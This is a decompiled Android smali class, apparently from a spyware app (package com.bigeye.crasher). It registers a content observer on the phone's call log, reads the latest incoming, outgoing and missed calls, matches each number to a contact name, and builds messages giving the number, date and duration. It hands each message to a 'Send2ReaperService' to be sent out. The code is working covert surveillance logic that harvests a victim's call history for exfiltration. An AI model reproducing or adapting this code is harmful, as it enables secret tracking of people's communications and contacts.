.class Lcom/bigeye/crasher/MonitorCallLogsService$1;
.super Landroid/database/ContentObserver;
.source "MonitorCallLogsService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bigeye/crasher/MonitorCallLogsService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bigeye/crasher/MonitorCallLogsService;


# direct methods
.method constructor <init>(Lcom/bigeye/crasher/MonitorCallLogsService;Landroid/os/Handler;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bigeye/crasher/MonitorCallLogsService;
    .param p2, "x0"    # Landroid/os/Handler;

    .prologue
    .line 38
    iput-object p1, p0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    .prologue
    .line 117
    const/4 v0, 0x1

    return v0
.end method

.method public onChange(Z)V
    .locals 24
    .param p1, "selfChange"    # Z

    .prologue
    .line 42
    const-string v3, "content://call_log/calls"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    .line 43
    .local v4, "logURI":Landroid/net/Uri;
    const/4 v5, 0x0

    .line 44
    .local v5, "projection":[Ljava/lang/String;
    const/4 v3, 0x3

    new-array v0, v3, [Ljava/lang/String;

    move-object/from16 v20, v0

    const/4 v3, 0x0

    const-string v6, "type = 1 AND new = 1"

    aput-object v6, v20, v3

    const/4 v3, 0x1

    const-string v6, "type = 2"

    aput-object v6, v20, v3

    const/4 v3, 0x2

    const-string v6, "type = 3 AND new = 1"

    aput-object v6, v20, v3

    .line 47
    .local v20, "selection":[Ljava/lang/String;
    const/4 v7, 0x0

    .line 48
    .local v7, "selectionArgs":[Ljava/lang/String;
    const/4 v8, 0x0

    .line 49
    .local v8, "sortOrder":Ljava/lang/String;
    const/4 v3, 0x3

    new-array v11, v3, [Landroid/database/Cursor;

    .line 52
    .local v11, "c":[Landroid/database/Cursor;
    const/16 v21, 0x0

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-virtual {v3}, Lcom/bigeye/crasher/MonitorCallLogsService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v6, 0x0

    aget-object v6, v20, v6

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    aput-object v3, v11, v21

    .line 55
    const-string v8, "date DESC LIMIT 1"

    .line 56
    const/16 v21, 0x1

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-virtual {v3}, Lcom/bigeye/crasher/MonitorCallLogsService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v6, 0x1

    aget-object v6, v20, v6

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    aput-object v3, v11, v21

    .line 59
    const/4 v8, 0x0

    .line 60
    const/16 v21, 0x2

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    invoke-virtual {v3}, Lcom/bigeye/crasher/MonitorCallLogsService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const/4 v6, 0x2

    aget-object v6, v20, v6

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    aput-object v3, v11, v21

    .line 62
    array-length v6, v11

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v6, :cond_5

    aget-object v15, v11, v3

    .line 64
    .local v15, "cursor":Landroid/database/Cursor;
    invoke-interface {v15}, Landroid/database/Cursor;->getCount()I

    move-result v21

    if-lez v21, :cond_4

    .line 66
    invoke-interface {v15}, Landroid/database/Cursor;->moveToFirst()Z

    .line 69
    const-string v21, "number"

    move-object/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    move/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v18

    .line 71
    .local v18, "phoneNo":Ljava/lang/String;
    new-instance v21, Lcom/bigeye/crasher/ReadContacts;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    move-object/from16 v22, v0

    invoke-virtual/range {v22 .. v22}, Lcom/bigeye/crasher/MonitorCallLogsService;->getApplicationContext()Landroid/content/Context;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Lcom/bigeye/crasher/ReadContacts;-><init>(Landroid/content/Context;)V

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Lcom/bigeye/crasher/ReadContacts;->getContactName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 73
    .local v17, "name":Ljava/lang/String;
    const-string v21, ""

    move-object/from16 v0, v17

    move-object/from16 v1, v21

    if-eq v0, v1, :cond_1

    .line 77
    :goto_1
    const-string v21, "date"

    move-object/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    move/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v9

    .line 78
    .local v9, "CDate":J
    new-instance v21, Landroid/text/format/DateFormat;

    invoke-direct/range {v21 .. v21}, Landroid/text/format/DateFormat;-><init>()V

    const-string v21, "dd-MMM-yyyy k:m:s"

    move-object/from16 v0, v21

    invoke-static {v0, v9, v10}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;

    move-result-object v21

    invoke-interface/range {v21 .. v21}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    .line 81
    .local v12, "callDate":Ljava/lang/String;
    const-string v21, "duration"

    move-object/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    move/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 84
    .local v16, "duration":Ljava/lang/String;
    const-string v21, "type"

    move-object/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    move/from16 v0, v21

    invoke-interface {v15, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 86
    .local v14, "callType":Ljava/lang/String;
    const-string v13, ""

    .line 87
    .local v13, "callLog":Ljava/lang/String;
    const/16 v21, 0x1

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v14, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_2

    .line 88
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuilder;-><init>()V

    const-string v22, "New Incoming call from: <"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, ">"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 95
    :cond_0
    :goto_2
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v21

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, " on "

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, " duration: "

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, " secs."

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 97
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService;->APP_TAG:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    invoke-static {v0, v13}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 100
    new-instance v19, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    move-object/from16 v21, v0

    invoke-virtual/range {v21 .. v21}, Lcom/bigeye/crasher/MonitorCallLogsService;->getApplicationContext()Landroid/content/Context;

    move-result-object v21

    const-class v22, Lcom/bigeye/crasher/Send2ReaperService;

    move-object/from16 v0, v19

    move-object/from16 v1, v21

    move-object/from16 v2, v22

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 101
    .local v19, "repo":Landroid/content/Intent;
    const-string v21, "OPERATION"

    const-string v22, "OUTGOING"

    move-object/from16 v0, v19

    move-object/from16 v1, v21

    move-object/from16 v2, v22

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 102
    const-string v21, "MSG"

    move-object/from16 v0, v19

    move-object/from16 v1, v21

    invoke-virtual {v0, v1, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 103
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lcom/bigeye/crasher/MonitorCallLogsService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 109
    .end local v9    # "CDate":J
    .end local v12    # "callDate":Ljava/lang/String;
    .end local v13    # "callLog":Ljava/lang/String;
    .end local v14    # "callType":Ljava/lang/String;
    .end local v16    # "duration":Ljava/lang/String;
    .end local v17    # "name":Ljava/lang/String;
    .end local v18    # "phoneNo":Ljava/lang/String;
    .end local v19    # "repo":Landroid/content/Intent;
    :goto_3
    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    .line 62
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_0

    .line 73
    .restart local v17    # "name":Ljava/lang/String;
    .restart local v18    # "phoneNo":Ljava/lang/String;
    :cond_1
    const-string v17, "unknown"

    goto/16 :goto_1

    .line 89
    .restart local v9    # "CDate":J
    .restart local v12    # "callDate":Ljava/lang/String;
    .restart local v13    # "callLog":Ljava/lang/String;
    .restart local v14    # "callType":Ljava/lang/String;
    .restart local v16    # "duration":Ljava/lang/String;
    :cond_2
    const/16 v21, 0x2

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v14, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_3

    .line 90
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuilder;-><init>()V

    const-string v22, "New Outgoing call to: <"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, ">"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    goto/16 :goto_2

    .line 91
    :cond_3
    const/16 v21, 0x3

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v14, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_0

    .line 92
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuilder;-><init>()V

    const-string v22, "New Missed call from: <"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, ">"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    goto/16 :goto_2

    .line 106
    .end local v9    # "CDate":J
    .end local v12    # "callDate":Ljava/lang/String;
    .end local v13    # "callLog":Ljava/lang/String;
    .end local v14    # "callType":Ljava/lang/String;
    .end local v16    # "duration":Ljava/lang/String;
    .end local v17    # "name":Ljava/lang/String;
    .end local v18    # "phoneNo":Ljava/lang/String;
    :cond_4
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService$1;->this$0:Lcom/bigeye/crasher/MonitorCallLogsService;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorCallLogsService;->APP_TAG:Ljava/lang/String;

    move-object/from16 v21, v0

    new-instance v22, Ljava/lang/StringBuilder;

    invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuilder;-><init>()V

    const-string v23, "count: "

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-interface {v15}, Landroid/database/Cursor;->getCount()I

    move-result v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v21 .. v22}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_3

    .line 113
    .end local v15    # "cursor":Landroid/database/Cursor;
    :cond_5
    return-void
.end method
